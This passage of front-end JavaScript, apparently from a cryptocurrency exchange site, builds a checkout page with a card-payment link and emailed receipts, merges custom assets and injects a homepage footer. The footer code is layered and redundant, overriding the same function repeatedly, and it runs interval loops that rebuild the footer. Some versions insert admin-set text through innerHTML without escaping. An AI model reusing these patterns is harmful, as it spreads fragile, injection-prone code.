                    <a href="${cardLink}" target="_blank" style="background: #00d4aa; color: #000; padding: 14px 20px; border-radius: 8px; text-decoration: none; font-weight: bold; display: block; font-size: 16px;">Click Here to Pay</a>
                </div>`;
        } else {
            detailsHtml = `<div class="warning-banner" style="text-align:left;"><p>Card payment link is not set. Please contact support.</p></div>`;
        }
    }

    const content = `
        <div style="text-align: center;">
            <div style="margin-bottom: 25px;">
                <div style="width: 60px; height: 60px; background: rgba(0,212,170,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
                </div>
                <h3 style="color: #fff; margin: 0 0 5px; font-size: 20px;">Order Created Successfully</h3>
                <p style="color: #888; font-size: 14px;">To complete your purchase of <strong style="color:#fff;">${cryptoAmount} ${symbol}</strong> for <strong style="color:#fff;">${fiatAmount}</strong>, please follow the steps below.</p>
            </div>

            ${detailsHtml}

            <div style="background: #1a1a2a; border: 1px solid #333; padding: 20px; border-radius: 8px; margin-bottom: 20px; text-align: center;">
                <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 10px;">Step 2: Send Payment Proof</p>
                <p style="color: #fff; font-size: 14px; margin-bottom: 15px;">After making the payment, click below to open your email app and send us your receipt.</p>
                <a href="${mailtoLink}" style="background: #00d4aa; color: #000; padding: 14px; border-radius: 8px; text-decoration: none; font-weight: bold; display: block; font-size: 16px;">Open Email App</a>
            </div>

            <button onclick="showView('dashboardView')" style="background: #2a2a3a; color: #fff; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; border: none; cursor: pointer;">Back to Dashboard</button>
        </div>
    `;
    
    // Use the page creator, not a popup!
    createPageView('buyCheckoutPage', 'Complete Payment', content);
    showView('buyCheckoutPage');
};

/* =====================================================
   HOMEPAGE FOOTER RENDERER
   ===================================================== */
const originalLoadGlobalSettings = window.loadGlobalSettings;
window.loadGlobalSettings = async function() {
    if(originalLoadGlobalSettings) await originalLoadGlobalSettings();
    
    // Render Footer
    const socialContainer = document.getElementById('socialLinksContainer');
    const legalText = document.getElementById('legalDisclaimerText');
    
    if (globalSettings && socialContainer && legalText) {
        let html = '';
        if (globalSettings.socialTwitter) html += `<a href="${globalSettings.socialTwitter}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Twitter (X)</a>`;
        if (globalSettings.socialTelegram) html += `<a href="${globalSettings.socialTelegram}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Telegram</a>`;
        if (globalSettings.socialDiscord) html += `<a href="${globalSettings.socialDiscord}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Discord</a>`;
        
        socialContainer.innerHTML = html;
        legalText.textContent = globalSettings.legalDisclaimer || '';
    }
};

/* =====================================================
   DYNAMIC HOMEPAGE FOOTER (Social & Legal)
   ===================================================== */
const originalFetchSettingsForFooter = window.loadGlobalSettings;
window.loadGlobalSettings = async function() {
    if(originalFetchSettingsForFooter) await originalFetchSettingsForFooter();
    
    // Check if footer already exists. If not, create it.
    let footer = document.getElementById('dynamicHomepageFooter');
    if (!footer) {
        footer = document.createElement('footer');
        footer.id = 'dynamicHomepageFooter';
        footer.style.cssText = "margin-top: 50px; border-top: 1px solid #2a2a3a; padding: 40px 20px; text-align: center; background: #09090d;";
        footer.innerHTML = `
            <div id="socialLinksContainer" style="display: flex; justify-content: center; gap: 20px; margin-bottom: 20px;"></div>
            <p id="legalDisclaimerText" style="color: #666; font-size: 11px; max-width: 600px; margin: 0 auto 20px; line-height: 1.5;"></p>
            <p style="color: #444; font-size: 11px;">© 2024 CoinWave Exchange. All rights reserved.</p>
        `;
        
        // Append to the guestView (homepage)
        const guestView = document.getElementById('guestView');
        if (guestView) guestView.appendChild(footer);
    }

    // Populate the footer with data
    const socialContainer = document.getElementById('socialLinksContainer');
    const legalText = document.getElementById('legalDisclaimerText');
    
    if (globalSettings && socialContainer && legalText) {
        let html = '';
        if (globalSettings.socialTwitter) html += `<a href="${globalSettings.socialTwitter}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Twitter (X)</a>`;
        if (globalSettings.socialTelegram) html += `<a href="${globalSettings.socialTelegram}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Telegram</a>`;
        if (globalSettings.socialDiscord) html += `<a href="${globalSettings.socialDiscord}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Discord</a>`;
        
        socialContainer.innerHTML = html;
        legalText.textContent = globalSettings.legalDisclaimer || '';
    }
};

/* =====================================================
   MERGE CUSTOM ASSETS & POPULATE FOOTER
   ===================================================== */
const originalLoadGlobalSettingsFinal = window.loadGlobalSettings;
window.loadGlobalSettings = async function() {
    if (originalLoadGlobalSettingsFinal) await originalLoadGlobalSettingsFinal();

    // 1. Merge Custom Assets into the Markets array
    if (globalSettings && globalSettings.customAssets && globalSettings.customAssets.length > 0) {
        globalSettings.customAssets.forEach(asset => {
            // Only add if it doesn't already exist
            if (!markets.find(m => m.symbol === asset.symbol)) {
                markets.push(asset);
            }
        });
        if (typeof loadMarkets === 'function') loadMarkets();
    }

    // 2. Populate Footer (Social & Legal)
    const socialContainer = document.getElementById('socialLinksContainer');
    const legalText = document.getElementById('legalDisclaimerText');
    
    if (globalSettings && socialContainer && legalText) {
        let html = '';
        if (globalSettings.socialTwitter) html += `<a href="${globalSettings.socialTwitter}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Twitter (X)</a>`;
        if (globalSettings.socialTelegram) html += `<a href="${globalSettings.socialTelegram}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Telegram</a>`;
        if (globalSettings.socialDiscord) html += `<a href="${globalSettings.socialDiscord}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Discord</a>`;
        
        socialContainer.innerHTML = html;
        legalText.textContent = globalSettings.legalDisclaimer || '';
    }
};

/* =====================================================
   BULLETPROOF FOOTER INJECTION (Bypasses HTML failures)
   ===================================================== */
setInterval(() => {
    const guestView = document.getElementById('guestView');
    if (guestView && !document.getElementById('dynamicHomepageFooter')) {
        const footer = document.createElement('footer');
        footer.id = 'dynamicHomepageFooter';
        footer.style.cssText = "margin-top: 50px; border-top: 1px solid #2a2a3a; padding: 40px 20px; text-align: center; background: #09090d;";
        footer.innerHTML = `
            <div id="socialLinksContainer" style="display: flex; justify-content: center; gap: 20px; margin-bottom: 20px;"></div>
            <p id="legalDisclaimerText" style="color: #666; font-size: 11px; max-width: 600px; margin: 0 auto 20px; line-height: 1.5;"></p>
            <p style="color: #444; font-size: 11px;">© 2024 CoinWave Exchange. All rights reserved.</p>
        `;
        guestView.appendChild(footer);

        // Populate the data instantly if settings are loaded
        if (globalSettings) {
            const socialContainer = document.getElementById('socialLinksContainer');
            const legalText = document.getElementById('legalDisclaimerText');
            let html = '';
            if (globalSettings.socialTwitter) html += `<a href="${globalSettings.socialTwitter}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Twitter (X)</a>`;
            if (globalSettings.socialTelegram) html += `<a href="${globalSettings.socialTelegram}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Telegram</a>`;
            if (globalSettings.socialDiscord) html += `<a href="${globalSettings.socialDiscord}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Discord</a>`;
            socialContainer.innerHTML = html;
            legalText.textContent = globalSettings.legalDisclaimer || '';
        }
    }
}, 1000);

/* =====================================================
   ULTIMATE FOOTER INJECTION (Forces it to render)
   ===================================================== */
function renderHomepageFooter() {
    // 1. Check if we are on the homepage
    const guestView = document.getElementById('guestView');
    if (!guestView) return;

    // 2. Remove old footer if it exists to prevent duplicates
    const oldFooter = document.getElementById('dynamicHomepageFooter');
    if (oldFooter) oldFooter.remove();

    // 3. Create the new professional footer
    const footer = document.createElement('footer');
    footer.id = 'dynamicHomepageFooter';
    footer.style.cssText = "margin-top: 50px; border-top: 1px solid #2a2a3a; padding: 40px 20px; text-align: center; background: #09090d;";

    let socialHtml = '<div style="display: flex; justify-content: center; gap: 20px; margin-bottom: 20px;">';
    if (globalSettings && globalSettings.socialTwitter) socialHtml += `<a href="${globalSettings.socialTwitter}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Twitter (X)</a>`;
    if (globalSettings && globalSettings.socialTelegram) socialHtml += `<a href="${globalSettings.socialTelegram}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Telegram</a>`;
    if (globalSettings && globalSettings.socialDiscord) socialHtml += `<a href="${globalSettings.socialDiscord}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Discord</a>`;
    socialHtml += '</div>';

    const legalText = (globalSettings && globalSettings.legalDisclaimer) ? globalSettings.legalDisclaimer : '';

    footer.innerHTML = `
        ${socialHtml}
        <p style="color: #666; font-size: 11px; max-width: 600px; margin: 0 auto 20px; line-height: 1.5;">${legalText}</p>
        <p style="color: #444; font-size: 11px;">© 2024 CoinWave Exchange. All rights reserved.</p>
    `;

    // 4. Append it to the homepage
    guestView.appendChild(footer);
}

// 1. Try to render when settings load
const originalLoadGlobal = window.loadGlobalSettings;
window.loadGlobalSettings = async function() {
    if(originalLoadGlobal) await originalLoadGlobal();
    renderHomepageFooter();
};

// 2. Try to render when user clicks "Markets" to go back to homepage
const originalShowView = window.showView;
window.showView = function(viewId, authType = 'login') {
    originalShowView(viewId, authType);
    if (viewId === 'guestView') {
        setTimeout(renderHomepageFooter, 100);
    }
};

// 3. Fallback interval just in case
setInterval(renderHomepageFooter, 2000);

/* =====================================================
   MERGE ADMIN CUSTOM ASSETS INTO HOMEPAGE
   ===================================================== */
const originalLoadForAssets = window.loadGlobalSettings;
window.loadGlobalSettings = async function() {
    if(originalLoadForAssets) await originalLoadForAssets();

    // If the Admin added custom assets, push them into the markets array
    if (globalSettings && globalSettings.customAssets && Array.isArray(globalSettings.customAssets)) {
        globalSettings.customAssets.forEach(asset => {
            // Check if it already exists to prevent duplicates
            if (!markets.find(m => m.symbol === asset.symbol)) {
                markets.push({
                    name: asset.name,
                    symbol: asset.symbol,
                    price: parseFloat(asset.price) || 0,
                    change: 0,
                    icon: asset.icon || asset.symbol.charAt(0),
                    color: asset.color || '#333333'
                });
            }
        });
        
        // Re-render the markets list and dropdowns
        if (typeof loadMarkets === 'function') loadMarkets();
        if (typeof populateTradeCoins === 'function') populateTradeCoins();
    }
};

/* =====================================================
   BULLETPROOF JS FOOTER INJECTION (No HTML edits needed)
   ===================================================== */
setInterval(() => {
    const guestView = document.getElementById('guestView');
    
    // Only run if we are on the homepage (guestView exists and is visible)
    if (guestView && guestView.style.display !== 'none') {
        
        // Check if footer already exists
        let footer = document.getElementById('dynamicHomepageFooter');
        
        if (!footer) {
            // Create the footer if it's missing
            footer = document.createElement('footer');
            footer.id = 'dynamicHomepageFooter';
            footer.style.cssText = "margin-top: 50px; border-top: 1px solid #2a2a3a; padding: 40px 20px; text-align: center; background: #09090d;";
            
            // Default values in case database is still loading
            let tw = "", tg = "", dc = "", legal = "";
            
            if (globalSettings) {
                tw = globalSettings.socialTwitter || "";
                tg = globalSettings.socialTelegram || "";
                dc = globalSettings.socialDiscord || "";
                legal = globalSettings.legalDisclaimer || "";
            }

            let socialHtml = '<div style="display: flex; justify-content: center; gap: 20px; margin-bottom: 20px;">';
            if (tw) socialHtml += `<a href="${tw}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Twitter (X)</a>`;
            if (tg) socialHtml += `<a href="${tg}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Telegram</a>`;
            if (dc) socialHtml += `<a href="${dc}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Discord</a>`;
            socialHtml += '</div>';

            footer.innerHTML = `
                ${socialHtml}
                <p style="color: #666; font-size: 11px; max-width: 600px; margin: 0 auto 20px; line-height: 1.5;">${legal}</p>
                <p style="color: #444; font-size: 11px;">© 2024 CoinWave Exchange. All rights reserved.</p>
            `;
            
            // Append to the homepage
            guestView.appendChild(footer);
        } else {
            // If footer exists, but settings just loaded, update the text
            if (globalSettings && footer.dataset.updated !== 'true') {
                footer.dataset.updated = 'true';
                let tw = globalSettings.socialTwitter || "";
                let tg = globalSettings.socialTelegram || "";
                let dc = globalSettings.socialDiscord || "";
                let legal = globalSettings.legalDisclaimer || "";
                
                let socialHtml = '<div style="display: flex; justify-content: center; gap: 20px; margin-bottom: 20px;">';
                if (tw) socialHtml += `<a href="${tw}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Twitter (X)</a>`;
                if (tg) socialHtml += `<a href="${tg}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Telegram</a>`;
                if (dc) socialHtml += `<a href="${dc}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Discord</a>`;
                socialHtml += '</div>';

                footer.innerHTML = `
                    ${socialHtml}
                    <p style="color: #666; font-size: 11px; max-width: 600px; margin: 0 auto 20px; line-height: 1.5;">${legal}</p>
                    <p style="color: #444; font-size: 11px;">© 2024 CoinWave Exchange. All rights reserved.</p>
                `;
            }
        }
    }
}, 1000);
